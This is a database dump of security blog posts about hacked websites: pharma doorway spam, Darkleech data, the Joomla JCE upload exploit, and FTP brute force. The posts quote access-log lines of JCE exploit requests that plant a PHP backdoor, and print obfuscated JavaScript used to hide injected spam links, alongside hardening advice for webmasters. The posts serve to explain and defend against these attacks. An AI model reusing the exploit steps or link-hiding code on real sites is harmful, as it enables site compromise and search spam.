enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (15, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (16, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (17, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (18, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (19, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (20, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a 